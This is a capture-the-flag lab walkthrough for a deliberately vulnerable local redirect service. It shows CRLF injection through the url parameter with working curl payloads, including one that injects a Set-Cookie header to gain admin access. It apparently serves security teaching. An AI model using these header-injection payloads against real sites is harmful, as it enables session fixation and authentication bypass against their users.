# Walkthrough

## Setup

```
$ docker compose up --build -d
```

Wait about 3 seconds for the Python server to start.

## Step 1: probe the application

```
$ curl -s http://127.0.0.1:8096/
```

Output:

```json
{"app":"CorpRedirector","endpoints":["GET /redirect?url=       -- vulnerable redirect","GET /safe-redirect?url=  -- fixed redirect","GET /check-injection        -- returns flag1 if X-Injected present","GET /admin                  -- returns flag2 if custom_session=admin","GET /profile                -- show cookies"]}
```

The app redirects users to a URL supplied in the `url` query parameter.

## Step 2: test normal redirect behavior

```
$ curl -si 'http://127.0.0.1:8096/redirect?url=%2Fhome'
```

Output:

```
HTTP/1.0 302 Found
Server: BaseHTTP/0.6 Python/3.12.11
Date: Sun, 09 Nov 2026 00:00:00 GMT
Location: /home
```

The Location header reflects the decoded `url` parameter.

## Step 3: confirm CRLF injection

Send `%0D%0A` (URL-encoded CR+LF) inside the `url` parameter, followed by an arbitrary header:

```
$ curl -si 'http://127.0.0.1:8096/redirect?url=/safe%0D%0AX-Injected%3A%20hacked'
```

Output:

```
HTTP/1.0 302 Found
Server: BaseHTTP/0.6 Python/3.12.11
Date: Sun, 09 Nov 2026 00:00:00 GMT
Location: /safe
X-Injected: hacked
```

`X-Injected: hacked` is a separate header in the response. The CRLF split the Location value into two header lines.

## Step 4: get Flag 1 from /check-injection

The `/check-injection` endpoint returns Flag 1 when the request contains `X-Injected`:

```
$ curl -s -H 'X-Injected: hacked-by-crlf' http://127.0.0.1:8096/check-injection
```

Output:

```json
{"flag1":"POC{...}","injected_value":"hacked-by-crlf"}
```

**Flag 1 captured.**

## Step 5: inject a Set-Cookie header

Inject `Set-Cookie: custom_session=admin` using the same technique:

```
$ curl -si 'http://127.0.0.1:8096/redirect?url=/safe%0D%0ASet-Cookie%3A%20custom_session%3Dadmin'
```

Output:

```
HTTP/1.0 302 Found
Server: BaseHTTP/0.6 Python/3.12.11
Date: Sun, 09 Nov 2026 00:00:00 GMT
Location: /safe
Set-Cookie: custom_session=admin
```

A browser following this redirect would automatically store `custom_session=admin` and send it on the next request.

## Step 6: get Flag 2 from /admin

Send the injected cookie to `/admin`:

```
$ curl -s -H 'Cookie: custom_session=admin' http://127.0.0.1:8096/admin
```

Output:

```json
{"secret":"POC{...}"}
```

**Flag 2 captured.**

## Full attack chain

```
/redirect?url=/safe%0D%0AX-Injected: hacked
        |
        v
  raw socket reads injected header from 302 response
        |
        v
  GET /check-injection  X-Injected: hacked-by-crlf
        |
        v
  FLAG 1

/redirect?url=/safe%0D%0ASet-Cookie: custom_session=admin
        |
        v
  raw socket reads Set-Cookie from 302 response
        |
        v
  GET /admin  Cookie: custom_session=admin
        |
        v
  FLAG 2
```

## Automated exploit

```
$ python3 exploit/exploit.py
```

This runs all four steps using raw TCP sockets and prints both flags.

## Teardown

```
$ docker compose down
```
